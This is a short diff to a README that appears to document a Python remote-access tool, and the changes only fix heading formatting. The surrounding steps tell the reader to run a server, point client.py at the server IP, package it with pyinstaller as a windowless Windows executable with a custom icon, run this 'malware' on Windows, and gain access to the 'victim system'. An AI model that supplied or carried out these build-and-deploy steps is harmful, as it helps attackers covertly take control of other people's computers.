@@ -41,11 +41,11 @@ sudo apt upgrade
 ```bash
 python3 server.py
 ```
-#### 5.craft client file (the malware)
+#### 5. Craft client file (the malware)
 change ip address of host to servers ip address in client.py file 
 ```bash
 pyinstaller.exe --onefile --icon=youricon.ico --noconsole --add-data="dat;." client.py
 ```
-#### 6.Run the malware in windows operating system 
+#### 6. Run the malware in windows operating system 
 
-#### 7.you'll Get access to victim system in server system 
+#### 7. You'll Get access to victim system in server system 
